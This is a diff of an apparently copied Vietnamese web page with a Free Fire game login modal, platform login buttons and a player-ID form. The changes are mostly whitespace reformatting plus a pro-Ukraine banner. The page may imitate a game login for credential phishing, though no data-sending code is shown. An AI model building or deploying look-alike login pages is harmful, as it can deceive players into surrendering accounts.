@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -38,7 +39,7 @@
 <body>
     <div class="s-header-1">
         <div class="container align-items--between">
-            <a href="index-2.html" class="hd-logo"><img src="images/logo.png" alt=""></a>
+            <a href="index.html" class="hd-logo"><img src="images/logo.png" alt=""></a>
             <div class="hd-menu">
                 <a href="javascript:;" ht-trigger="hd-menu"><span>☰</span><span>×</span></a>
             </div>
@@ -83,15 +84,14 @@
             </div>
         </div>
     </div>
-    <div id="modalLogin2" class="c-modal c-modal-freefire" ht-close="c-modal" >
+    <div id="modalLogin2" class="c-modal c-modal-freefire" ht-close="c-modal">
         <div class="c-modal-box c-modal-box-freefire">
             <div id="loginForm" style="display:none" ht-skip="parent">
                 <div class="loginForm_container">
                     <div class="base_container">
                         <div class="base_detail_container">
                             <div class="btnClose" onclick="closeLogin()" ht-close="c-modal"></div>
-                            <img class="logo_freeFire"
-                                src="images/faifai.png">
+                            <img class="logo_freeFire" src="images/faifai.png">
                             <div class="freeFire_text_item">Free Fire</div>
                             <div class="text_login_with">Đăng nhập với</div>
                             <div class="plats_login">
@@ -105,7 +105,8 @@
                                     class="item_plats">
                             </div>
                             <div onclick="Idnguoichoi()" class="btn_change_popup xs-hidden">ID người chơi &gt;&gt;</div>
-                            <div onclick="Idnguoichoi2()" class="btn_change_popup lg-hidden">ID người chơi &gt;&gt;</div>
+                            <div onclick="Idnguoichoi2()" class="btn_change_popup lg-hidden">ID người chơi &gt;&gt;
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -119,10 +120,10 @@
                                 <div class="titleFormWithId">ID đăng nhập<i class="iconId"></i>
                                 </div>
                                 <form class="detailFormWithId">
-                                    <div class="sectionField"><label for="playerId"
-                                            class="labelField">ID người chơi</label><input id="playerId"
-                                            type="text" placeholder="Hãy nhập UID của bạn" maxlength="64"
-                                            autofocus="true" class="inputField"></div>
+                                    <div class="sectionField"><label for="playerId" class="labelField">ID người
+                                            chơi</label><input id="playerId" type="text"
+                                            placeholder="Hãy nhập UID của bạn" maxlength="64" autofocus="true"
+                                            class="inputField"></div>
                                     <input class="btnLogin" type="submit" value="Đăng nhập">
                                 </form>
                             </div>
@@ -190,7 +191,8 @@
                     </a>
                 </div>
                 <div class="col-6 col-sm-4">
-                    <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin2" class="b-card-1 faifai" onclick="openLogin()">
+                    <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin2" class="b-card-1 faifai"
+                        onclick="openLogin()">
                         <!-- LINK -->
                         <img src="images/faifai.png" alt="">
                         <h3>Free Fire</h3>
@@ -404,6 +406,71 @@
             window.location = "login.html";
         }
     </script>
-<style>.footer,.generic-footer{margin-bottom:98px}@media (min-width:374px){.footer,.generic-footer{margin-bottom:78px}}@media (min-width:546px){.footer,.generic-footer{margin-bottom:56px}}@media (min-width:1055px){.footer,.generic-footer{margin-bottom:0}}.disclaimer{position:fixed;z-index:9999999;bottom:0;right:0;border-top:2px solid #ff5c62;text-align:center;font-size:14px;font-weight:400;background-color:#fff;padding:5px 10px 5px 10px}.disclaimer a:hover{text-decoration:underline}@media (min-width:1052px){.disclaimer{text-align:right;border-left:2px solid red;border-top-left-radius:10px}}@media (min-width:1920px){.disclaimer{width:60%}}</style><div class="disclaimer">We support Ukraine and condemn war. Push Russian government to act against war. Be brave, vocal and show your support to Ukraine. Follow the latest news <a title="https://www.bbc.com/news/live/world-europe-60517447" target="_blank" href="https://www.bbc.com/news/live/world-europe-60517447" style="color: black;"><b>HERE</b></a></div></body>
+    <style>
+        .footer,
+        .generic-footer {
+            margin-bottom: 98px
+        }
+
+        @media (min-width:374px) {
+
+            .footer,
+            .generic-footer {
+                margin-bottom: 78px
+            }
+        }
+
+        @media (min-width:546px) {
+
+            .footer,
+            .generic-footer {
+                margin-bottom: 56px
+            }
+        }
+
+        @media (min-width:1055px) {
+
+            .footer,
+            .generic-footer {
+                margin-bottom: 0
+            }
+        }
+
+        .disclaimer {
+            position: fixed;
+            z-index: 9999999;
+            bottom: 0;
+            right: 0;
+            border-top: 2px solid #ff5c62;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 400;
+            background-color: #fff;
+            padding: 5px 10px 5px 10px
+        }
+
+        .disclaimer a:hover {
+            text-decoration: underline
+        }
+
+        @media (min-width:1052px) {
+            .disclaimer {
+                text-align: right;
+                border-left: 2px solid red;
+                border-top-left-radius: 10px
+            }
+        }
+
+        @media (min-width:1920px) {
+            .disclaimer {
+                width: 60%
+            }
+        }
+    </style>
+    <div class="disclaimer">We support Ukraine and condemn war. Push Russian government to act against war. Be brave,
+        vocal and show your support to Ukraine. Follow the latest news <a
+            title="https://www.bbc.com/news/live/world-europe-60517447" target="_blank"
+            href="https://www.bbc.com/news/live/world-europe-60517447" style="color: black;"><b>HERE</b></a></div>
+</body>
 
 </html>
